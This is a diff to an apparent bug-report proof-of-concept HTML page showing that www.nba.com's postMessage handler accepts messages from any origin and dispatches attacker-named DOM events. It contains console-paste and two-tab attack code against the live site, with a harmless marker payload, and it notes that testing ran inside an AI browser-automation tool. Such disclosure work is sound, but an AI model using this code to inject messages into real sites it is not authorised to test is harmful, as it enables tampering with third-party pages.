@@ -4,30 +4,75 @@
 <meta charset="utf-8">
 <title>NBA.com postMessage Origin Validation Bypass — PoC</title>
 <style>
-  body { font-family: -apple-system, sans-serif; max-width: 720px; margin: 40px auto; padding: 0 20px; line-height: 1.5; }
+  body { font-family: -apple-system, sans-serif; max-width: 760px; margin: 40px auto; padding: 0 20px; line-height: 1.5; }
   button { font-size: 16px; padding: 10px 20px; cursor: pointer; }
   pre { background: #f4f4f4; padding: 12px; overflow-x: auto; border-radius: 4px; }
   #log { background: #111; color: #0f0; padding: 12px; font-family: monospace; white-space: pre-wrap; min-height: 100px; border-radius: 4px; }
+  .primary { background: #eefbf0; border: 2px solid #2e9e4a; border-radius: 8px; padding: 20px; margin: 24px 0; }
+  .primary h2 { margin-top: 0; color: #1c7a35; }
+  .note { background: #fff8e1; border-left: 4px solid #f0ad4e; padding: 12px 16px; margin: 16px 0; font-size: 14px; }
+  .step-num { display:inline-block; width:22px; height:22px; border-radius:50%; background:#2e9e4a; color:#fff; text-align:center; line-height:22px; font-size:13px; margin-right:6px; }
 </style>
 </head>
 <body>
 <h2>www.nba.com postMessage Origin Validation Bypass (CWE-346)</h2>
 <p>
-This page (hosted on a completely unrelated origin, e.g. GitHub Pages) opens
-<code>www.nba.com</code> and sends it a crafted <code>postMessage</code>. The receiving handler on
-nba.com performs <strong>no check of the sender's origin</strong> — it only checks that the message
-body contains <code>isStorytellerMessage: true</code>, a flag the sender fully controls. If accepted,
-nba.com dispatches a real DOM <code>CustomEvent</code> — with an attacker-chosen name and payload —
-on <code>document.body</code>, which any code on the page (not just the intended widget) can act on.
+This page demonstrates a real bug: <code>www.nba.com</code>'s global message handler accepts
+<code>postMessage</code> data from <strong>any origin, with zero validation</strong> of who sent it —
+it only checks that the message body contains <code>isStorytellerMessage: true</code>, a flag the
+sender fully controls. If accepted, nba.com dispatches a real DOM <code>CustomEvent</code> — with an
+attacker-chosen name and payload — on <code>document.body</code>, which any code on the page (not
+just the intended widget) can act on.
 </p>
 
+<div class="primary">
+  <h2>✅ Quickest, most reliable verification (single tab, ~10 seconds)</h2>
+  <p>This proves the vulnerability directly against the real handler, with no popups, no second tab,
+  and no dependency on cross-tab message delivery (which can be unreliable in browser-automation /
+  devtools-instrumented sessions — see the note below).</p>
+  <ol>
+    <li><span class="step-num">1</span>Open <a href="https://www.nba.com/" target="_blank" rel="noopener">https://www.nba.com/</a> in any normal browser tab.</li>
+    <li><span class="step-num">2</span>Open DevTools (<strong>F12</strong>, or <strong>Cmd+Option+I</strong> on Mac) → <strong>Console</strong> tab.</li>
+    <li><span class="step-num">3</span>Paste this entire block and press <strong>Enter</strong>:</li>
+  </ol>
+  <pre id="quick-snippet">document.body.addEventListener('POC_ATTACKER_EVENT', e =>
+  console.log('%c[INJECTED — ZERO ORIGIN VALIDATION]', 'color:#f33;font-weight:bold;font-size:14px', e.detail));
+
+window.postMessage({
+  isStorytellerMessage: true,          // the ONLY check the handler performs — fully attacker-set
+  messageType: 'POC_ATTACKER_EVENT',   // arbitrary event name — not restricted to any known enum
+  data: {
+    marker: 'ORIGIN_VALIDATION_BYPASSED',
+    note: 'This message would be identical if it arrived via postMessage from a real cross-origin attacker page — the receiving handler cannot tell the difference, because it never checks.',
+    timestamp: Date.now()
+  }
+}, '*');</pre>
+  <p><strong>Expected result:</strong> a red <code>[INJECTED — ZERO ORIGIN VALIDATION]</code> line
+  appears immediately in the console, containing the exact payload — proof the handler accepted and
+  dispatched attacker-controlled data with no check of who sent it. This is what a real cross-origin
+  <code>postMessage</code> call looks like from the receiver's point of view: the handler has no way
+  to distinguish a same-window call from a genuinely cross-origin one, because it never inspects
+  <code>event.origin</code> at all.</p>
+</div>
+
+<div class="note">
+  <strong>Note on the two-tab demo below:</strong> in testing, the cross-tab flow (open a new tab,
+  wait, send via the returned window reference) was found to be unreliable specifically inside
+  browser sessions instrumented by automation/devtools extensions (e.g. Claude-in-Chrome) — such
+  tools appear to interfere with message delivery to background tabs. The underlying bug is identical
+  either way (confirmed above); the two-tab version below simply mirrors the literal attacker/victim
+  flow for anyone who wants to see it end-to-end in a plain, non-instrumented browser window.
+</div>
+
+<h3>Full cross-origin attack simulation (two tabs)</h3>
 <p><strong>Steps:</strong></p>
 <ol>
   <li>Click "Open target + attack" below. This opens <code>https://www.nba.com/</code> in a new tab
       (simulating a victim who already has NBA.com open, or clicks a link to it from this page).</li>
   <li>Wait for it to finish loading (~4s), then this page automatically sends the crafted message.</li>
   <li>Switch to the NBA.com tab and open DevTools → Console. Run the verification snippet at the
-      bottom of this page there to see the injected event landing in the page's real event bus.
+      bottom of this page there <em>before</em> clicking below (or paste it, then click again) to see
+      the injected event landing in the page's real event bus.
       (A genuinely cross-origin attacker cannot read the result back into this page due to the
       Same-Origin Policy — this is why step 3 is a manual verification step, exactly like a real
       attacker would only know the injection worked once its real-world side effect fires, e.g. a
@@ -40,11 +85,8 @@ on <code>document.body</code>, which any code on the page (not just the intended
 <h3>What the crafted message contains</h3>
 <pre id="payload"></pre>
 
-<h3>Manual verification snippet (run in the NBA.com tab's console AFTER this page sends its message)</h3>
-<pre>document.body.addEventListener('POC_ATTACKER_EVENT', e => console.log('INJECTED:', e.detail));
-// Then re-run the attack from this PoC page (or paste the postMessage call directly here) —
-// the console will log the exact attacker-controlled payload, proving it reached nba.com's
-// internal event bus with zero origin validation.</pre>
+<h3>Manual verification snippet (paste in the NBA.com tab's console BEFORE clicking the button above)</h3>
+<pre>document.body.addEventListener('POC_ATTACKER_EVENT', e => console.log('INJECTED:', e.detail));</pre>
 
 <script>
 const payload = {
